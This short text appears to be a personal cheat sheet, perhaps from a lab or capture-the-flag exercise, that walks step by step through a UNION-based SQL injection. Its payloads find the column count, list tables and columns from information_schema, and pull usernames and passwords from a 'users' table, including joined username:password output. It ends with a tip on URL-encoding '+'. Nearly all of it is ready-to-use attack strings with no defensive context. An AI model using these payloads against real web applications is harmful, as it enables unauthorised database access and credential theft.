#Step 1:

' order by 2--

#Step 2:

' union select null,table_name from information_schema.tables--

#Step 3:

' union select null,column_name from information_schema.columns where table_name = 'users'--

#Step 4:

' union select null,username from users--

' union select null,password from users--

Or we can concatenate both strings like that

' union select null,username||password from users--

' union select null,username||':'||password from users-- [To differentiate between two strings.]


When sending a GET request, the + character is often interpreted as a space in URL encoding. To send a + character in a URL, you should encode it properly. The URL-encoded representation of + is %2B.
